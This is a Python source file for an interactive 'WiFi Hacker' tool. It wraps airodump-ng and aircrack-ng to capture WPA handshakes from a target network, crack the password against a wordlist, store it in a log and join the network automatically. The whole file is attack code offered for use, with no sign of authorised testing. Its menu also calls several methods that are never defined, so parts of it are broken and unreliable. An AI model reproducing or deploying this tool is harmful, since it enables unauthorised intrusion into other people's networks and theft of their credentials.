#!/usr/bin/env python3
import os
import sys
import time
import json
import threading
import subprocess
import argparse
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from queue import Queue
import signal
import re
import psutil

class WifiHacker:
    def __init__(self):
        self.interface = None
        self.wordlist = None
        self.target_bssid = None
        self.target_essid = None
        self.handshake_dir = "./handshakes"
        self.log_file = "./logs/wifi_hacker.log"
        self.network_history = {}
        self.capturing = False
        self.cracking = False
        self.scan_results = []
        self.crack_queue = Queue()
        self.active_threads = []
        self.stats = {
            "packets_captured": 0,
            "cracked_passwords": 0,
            "total_targets": 0,
            "failed_attempts": 0
        }
        
        # Create directories if they don't exist
        os.makedirs(self.handshake_dir, exist_ok=True)
        os.makedirs(os.path.dirname(self.log_file), exist_ok=True)
        
        # Initialize logging
        self._setup_logging()
    
    def _setup_logging(self):
        """Set up logging configuration"""
        import logging
        
        # Create logger
        self.logger = logging.getLogger("wifi_hacker")
        self.logger.setLevel(logging.DEBUG)
        
        # Create formatter
        formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        
        # Console handler
        console_handler = logging.StreamHandler(sys.stdout)
        console_handler.setFormatter(formatter)
        self.logger.addHandler(console_handler)
        
        # File handler
        file_handler = logging.FileHandler(self.log_file)
        file_handler.setFormatter(formatter)
        self.logger.addHandler(file_handler)
        
        self.logger.info("WiFi Hacker initialized")
    
    def scan_networks(self) -> List[Dict]:
        """Scan for available WiFi networks"""
        try:
            self.logger.info(f"Scanning for networks on {self.interface}")
            
            # Run airodump-ng to capture scan results
            cmd = [
                "airodump-ng",
                "--output-format", "csv",
                "-w", f"{self.handshake_dir}/scan",
                self.interface
            ]
            
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Wait for scan to complete (15 seconds)
            time.sleep(15)
            proc.terminate()
            
            # Read scan results
            result_file = f"{self.handshake_dir}/scan-01.csv"
            networks = []
            
            if os.path.exists(result_file):
                with open(result_file, 'r') as f:
                    lines = f.readlines()
                    
                # Parse CSV output
                for line in lines:
                    if "BSSID" in line:  # Skip header
                        continue
                    
                    parts = line.split(',')
                    if len(parts) >= 8:
                        networks.append({
                            "bssid": parts[0].strip(),
                            "channel": parts[3].strip(),
                            "signal": parts[6].strip(),
                            "encryption": parts[7].strip(),
                            "essid": parts[13].strip() or "(hidden)"
                        })
            
            self.scan_results = networks
            self.logger.info(f"Found {len(networks)} networks")
            return networks
            
        except Exception as e:
            self.logger.error(f"Error scanning networks: {str(e)}")
            return []
    
    def capture_handshake(self, bssid: str, channel: str, essid: str) -> bool:
        """Capture handshake from target network"""
        try:
            self.logger.info(f"Starting handshake capture for {essid} ({bssid}) on channel {channel}")
            
            # Create capture file name
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            capture_file = f"{self.handshake_dir}/{essid}_{timestamp}"
            
            # Start airodump-ng capture
            cmd = [
                "airodump-ng",
                "--bssid", bssid,
                "--channel", channel,
                "--write", capture_file,
                self.interface
            ]
            
            self.capture_proc = subprocess.Popen(cmd)
            self.capturing = True
            
            # Wait for handshake (timeout after 60 seconds)
            timeout = time.time() + 60
            while time.time() < timeout:
                if self._check_for_handshake(capture_file):
                    self.logger.info(f"Handshake captured successfully")
                    self.capturing = False
                    return True
                
                time.sleep(1)
            
            # Terminate capture if no handshake found
            self.capture_proc.terminate()
            self.capturing = False
            self.logger.warning("No handshake found within timeout period")
            return False
            
        except Exception as e:
            self.logger.error(f"Error capturing handshake: {str(e)}")
            self.capturing = False
            return False
    
    def _check_for_handshake(self, capture_file: str) -> bool:
        """Check if handshake was captured"""
        try:
            # Check if .cap file exists and contains handshake
            cap_file = f"{capture_file}.cap"
            if not os.path.exists(cap_file):
                return False
                
            # Use aircrack-ng to check for handshake
            cmd = ["aircrack-ng", cap_file]
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, _ = proc.communicate(timeout=5)
            
            # Check output for handshake
            return b"handshake" in output.lower()
        except:
            return False
    
    def crack_password(self, bssid: str, channel: str, essid: str, wordlist: str) -> bool:
        """Crack WPA/WPA2 password using specified wordlist"""
        try:
            self.logger.info(f"Starting password cracking for {essid} ({bssid}) using {wordlist}")
            
            # Find handshake file
            handshake_files = [f for f in os.listdir(self.handshake_dir) 
                              if f.startswith(essid) and f.endswith('.cap')]
            
            if not handshake_files:
                self.logger.error("No handshake file found for target network")
                return False
            
            handshake_file = os.path.join(self.handshake_dir, handshake_files[0])
            
            # Start aircrack-ng to crack password
            cmd = [
                "aircrack-ng",
                "-w", wordlist,
                "-b", bssid,
                handshake_file
            ]
            
            self.crack_proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.cracking = True
            
            # Monitor output for success
            output = ""
            while self.cracking:
                line = self.crack_proc.stdout.readline()
                if not line:
                    break
                
                output += line.decode('utf-8')
                
                # Check for success
                if "KEY FOUND" in output:
                    match = re.search(r"KEY FOUND!\s*:\s*(.+)", output)
                    if match:
                        password = match.group(1).strip()
                        self.logger.info(f"Password found! Password: {password}")
                        self.stats["cracked_passwords"] += 1
                        
                        # Export log
                        self._export_log(bssid, essid, password)
                        
                        # Auto-reconnect
                        self._auto_reconnect(essid, password)
                        
                        return True
                
                time.sleep(0.1)
            
            self.cracking = False
            return False
            
        except Exception as e:
            self.logger.error(f"Error cracking password: {str(e)}")
            self.cracking = False
            return False
    
    def _auto_reconnect(self, essid: str, password: str):
        """Auto-reconnect to network after cracking"""
        try:
            self.logger.info(f"Auto-reconnecting to {essid}")
            
            # Create temporary config file
            config = f"""
network={{
    ssid="{essid}"
    psk="{password}"
}}
"""
            
            config_file = "/tmp/wifi_connect.conf"
            with open(config_file, 'w') as f:
                f.write(config)
            
            # Connect to network
            cmd = ["nmcli", "device", "wifi", "connect", essid, "password", password]
            subprocess.run(cmd, check=True)
            
            self.logger.info(f"Successfully connected to {essid}")
            
        except Exception as e:
            self.logger.error(f"Error auto-reconnecting: {str(e)}")
    
    def _export_log(self, bssid: str, essid: str, password: str):
        """Export cracking results to log file"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = {
            "timestamp": timestamp,
            "target": {"bssid": bssid, "essid": essid},
            "status": "success",
            "password": password
        }
        
        # Add to history
        if bssid not in self.network_history:
            self.network_history[bssid] = []
        
        self.network_history[bssid].append(log_entry)
        
        # Write to file
        with open(self.log_file, 'a') as f:
            json.dump(log_entry, f)
            f.write("\n")
        
        self.logger.info(f"Log exported for {essid}")
    
    def start_targeting(self, target_bssid: str, target_essid: str, channel: str, wordlist: str):
        """Start targeting a specific network"""
        try:
            # Capture handshake
            if not self.capture_handshake(target_bssid, channel, target_essid):
                return False
            
            # Crack password
            return self.crack_password(target_bssid, channel, target_essid, wordlist)
            
        except Exception as e:
            self.logger.error(f"Error starting targeting: {str(e)}")
            return False
    
    def stop_capture(self):
        """Stop handshake capture"""
        if hasattr(self, 'capture_proc'):
            self.capture_proc.terminate()
        self.capturing = False
        self.logger.info("Capture stopped")
    
    def stop_cracking(self):
        """Stop password cracking"""
        if hasattr(self, 'crack_proc'):
            self.crack_proc.terminate()
        self.cracking = False
        self.logger.info("Cracking stopped")
    
    def list_networks(self):
        """List available networks"""
        if not self.scan_results:
            print("No networks found. Please run scan first.")
            return
        
        print("\nAvailable Networks:")
        print("-" * 60)
        print(f"{'BSSID':<18} {'Channel':<8} {'Signal':<8} {'Encryption':<12} {'ESSID'}")
        print("-" * 60)
        
        for net in self.scan_results:
            print(f"{net['bssid']:<18} {net['channel']:<8} {net['signal']:<8} "
                  f"{net['encryption']:<12} {net['essid']}")
        
        print("\nTotal networks:", len(self.scan_results))
    
    def show_stats(self):
        """Show cracking statistics"""
        print("\nCracking Statistics:")
        print("-" * 40)
        print(f"Total targets: {self.stats['total_targets']}")
        print(f"Successful cracks: {self.stats['cracked_passwords']}")
        print(f"Failed attempts: {self.stats['failed_attempts']}")
        print(f"Packets captured: {self.stats['packets_captured']}")
        
        if self.capturing:
            print("Status: Capturing handshake...")
        elif self.cracking:
            print("Status: Cracking password...")
        else:
            print("Status: Idle")
    
    def main_loop(self):
        """Main interactive loop"""
        while True:
            print("\nWiFi Hacker Main Menu:")
            print("-" * 30)
            print("1. Scan for networks")
            print("2. Show available networks")
            print("3. Target network")
            print("4. Start capture")
            print("5. Stop capture")
            print("6. Start cracking")
            print("7. Stop cracking")
            print("8. Show stats")
            print("9. Export logs")
            print("0. Exit")
            
            choice = input("\nEnter your choice: ")
            
            if choice == "1":
                self.scan_networks()
            elif choice == "2":
                self.list_networks()
            elif choice == "3":
                bssid = input("Enter BSSID to target: ")
                essid = input("Enter ESSID to target: ")
                channel = input("Enter channel: ")
                wordlist = input("Enter wordlist path: ")
                self.start_targeting(bssid, essid, channel, wordlist)
            elif choice == "4":
                self.start_capture()
            elif choice == "5":
                self.stop_capture()
            elif choice == "6":
                self.start_cracking()
            elif choice == "7":
                self.stop_cracking()
            elif choice == "8":
                self.show_stats()
            elif choice == "9":
                self.export_logs()
            elif choice == "0":
                break
            else:
                print("Invalid choice")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="WiFi Hacker Tool")
    parser.add_argument("--interface", default="wlan0", help="Network interface")
    parser.add_argument("--wordlist", default="/usr/share/wordlists/rockyou.txt", 
                       help="Path to wordlist file")
    
    args = parser.parse_args()
    
    hacker = WifiHacker()
    hacker.interface = args.interface
    hacker.wordlist = args.wordlist
    
    # Set up signal handlers
    def signal_handler(sig, frame):
        print("\nExiting...")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    # Run main loop
    hacker.main_loop()